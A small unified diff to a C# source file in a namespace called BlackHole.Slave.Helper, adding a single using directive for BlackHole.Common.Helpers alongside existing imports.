@@ -2,6 +2,7 @@
 using System.IO;
 using System.Linq;
 using BlackHole.Common;
+using BlackHole.Common.Helpers;
 using BlackHole.Common.Network.Protocol;
 
 namespace BlackHole.Slave.Helper
